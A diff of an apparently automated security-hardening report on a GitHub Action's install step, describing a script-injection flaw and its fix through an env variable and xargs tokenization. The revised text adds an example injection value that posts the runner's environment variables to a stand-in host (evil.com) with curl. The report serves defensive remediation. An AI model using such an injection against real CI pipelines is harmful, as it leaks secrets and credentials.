@@ -16,11 +16,11 @@ Action **trunk-io--trunk-action--install/v1.2.4** was hardened automatically. 2 
 
 ### script-injection (severity: high)
 
-Sub-rule (a) violation: The `${{ inputs.tools }}` expression is directly interpolated inside a `run:` shell command string on line 30 of action.yaml (`run: trunk tools install --ci ${{ inputs.tools }}`). GitHub Actions performs template substitution before the shell ever sees the string, so an attacker-controlled value for `inputs.tools` can inject arbitrary shell commands (e.g. `; malicious-command`). Additionally, the value is unquoted (sub-rule b), allowing shell metacharacter splitting. The fix is to pass the input via an `env:` variable and double-quote it: `env: { TOOLS: "${{ inputs.tools }}" }` then `run: trunk tools install --ci "$TOOLS"`.
+Sub-rule (a) violation: The 'Trunk install' step in action.yaml directly interpolates `${{ inputs.tools }}` inside a `run:` shell command string: `trunk tools install --ci ${{ inputs.tools }}`. The `inputs.tools` value is attacker-controlled and is substituted into the shell command before the shell ever sees it, allowing an attacker to inject arbitrary shell commands (e.g., by passing a value like `; curl -X POST https://evil.com -d "$(env)"`). The value must be passed via an `env:` variable and double-quoted in the shell command instead.
 
 Locations:
 
-- `action.yaml:30`
+- `action.yaml:27`
 
 ### static-inline-injection (severity: high)
 
@@ -38,5 +38,5 @@ Locations:
 
 **Notes:**
 
-Fixed the script injection vulnerability in hardened/action/action.yaml. The `${{ inputs.tools }}` expression was directly interpolated in the `run:` shell command on line 30, allowing shell injection. The fix moves the expression to an `env:` block as `INPUT_TOOLS`, then uses the xargs tokenization pattern (with an empty-value guard) to safely expand the list of tool names as separate arguments to `trunk tools install --ci`. Both findings (script-injection and static-inline-injection) referred to the same issue in the same file.
+Fixed the script injection in the 'Trunk install' step of action.yaml. Moved `${{ inputs.tools }}` out of the run: shell string into an env: variable (INPUT_TOOLS). Since inputs.tools is a space-separated list of tool names, used the xargs-based tokenization pattern to safely split it into an array with quote-aware parsing. The array is then expanded as separate arguments to `trunk tools install --ci`. An empty-guard ensures no empty argument is passed when the optional input is not provided.
 
